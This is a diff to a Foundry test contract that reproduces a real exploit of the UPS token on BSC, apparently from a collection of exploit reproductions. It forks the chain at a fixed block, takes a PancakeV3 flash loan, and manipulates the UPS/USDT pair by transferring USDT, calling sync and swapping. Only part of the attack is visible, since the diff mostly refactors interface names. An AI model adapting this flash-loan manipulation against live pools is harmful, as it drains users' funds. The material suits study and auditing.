@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // TX : https://app.blocksec.com/explorer/tx/bsc/0xd03702e17171a32464ce748b8797008d59e2dbcecd3b3847d5138414566c886d
 // GUY : https://twitter.com/0xNickLFranklin/status/1777589021058728214
@@ -14,14 +13,13 @@ contract ContractTest is Test {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 UPS = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
-    Uni_Pair_V2 ups_usdt = Uni_Pair_V2(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);
-    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV3Pair pool = IUniswapV3Pair(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
+    IUniswapV2Pair ups_usdt = IUniswapV2Pair(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);
+    IUniswapV2Router router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     uint256 borrow_amount;
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 37_680_754);
+        vm.createSelectFork("bsc", 37_680_754);
         deal(address(USDT), address(this), 0);
     }
 
@@ -32,7 +30,12 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
-    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
+    function pancakeV3FlashCallback(
+        uint256 fee0,
+        uint256 fee1,
+        /*fee1*/
+        bytes memory /*data*/
+    ) public {
         USDT.transfer(address(ups_usdt), 2_000_000 ether);
         ups_usdt.sync();
         swap_token_to_token(address(USDT), address(UPS), 1_000_000 ether);
